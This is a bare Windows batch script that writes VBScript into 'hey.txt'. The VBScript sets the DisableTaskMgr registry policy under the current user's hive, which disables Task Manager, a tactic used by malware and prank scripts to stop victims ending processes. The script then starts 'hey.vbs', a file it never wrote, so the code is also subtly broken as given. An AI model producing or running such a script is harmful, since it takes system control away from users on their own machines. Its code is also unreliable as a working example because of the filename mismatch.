@echo off
(echo Dim Shell, regCommand
echo Set Shell = WScript.CreateObject("WScript.Shell")
echo Shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System", ""
echo Shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
) >hey.txt
pause
start hey.vbs